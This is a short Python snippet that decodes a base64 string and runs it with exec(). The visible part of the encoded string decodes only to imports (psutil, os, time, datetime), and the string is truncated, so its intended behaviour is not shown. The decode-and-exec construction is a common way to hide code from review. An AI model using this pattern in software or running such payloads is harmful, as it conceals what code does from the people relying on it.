import base64 as b64
_payload = "aW1wb3J0IHBzdXRpbAppbXBvcnQgb3MKaW1wb3J0IHRpbWUKZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZXRpbWUK..."
exec(b64.b64decode(_payload).decode('utf-8'))